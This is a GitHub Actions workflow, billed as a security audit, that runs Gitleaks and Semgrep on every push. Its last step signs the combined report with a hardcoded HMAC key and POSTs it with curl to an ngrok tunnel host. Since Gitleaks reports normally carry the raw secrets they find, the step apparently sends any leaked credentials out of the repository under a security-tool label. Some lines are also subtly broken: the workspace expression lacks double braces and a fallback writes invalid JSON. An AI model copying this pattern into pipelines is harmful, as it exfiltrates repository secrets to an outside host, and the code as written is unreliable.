
name: Sentinel Arsenal
on: [push]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - name: Gitleaks (Secrets)
        run: docker run -v ${ github.workspace }:/path zricethezav/gitleaks:latest detect --source="/path" --report-format=json --report-path=gitleaks.json || echo "[]" > gitleaks.json
      - name: Semgrep (SAST)
        run: pip install semgrep && semgrep scan --config=auto --json > semgrep.json || echo "{"results":[]}" > semgrep.json
      - name: Ship Securely
        run: |
          echo "{\"repo_name\": \"RBS3/loginsignup\", \"origin\": \"scanner\", \"gitleaks\": $(cat gitleaks.json), \"semgrep\": $(cat semgrep.json)}" > report.json
          SIG=$(openssl dgst -sha256 -hmac "e7eba92262a85f96d3fcf69df8acd6e4" report.json | sed 's/.* //')
          curl -X POST https://redressible-heide-eligibly.ngrok-free.dev/upload-scan -H "X-Sentinel-Signature: $SIG" -H "Content-Type: application/json" -d @report.json
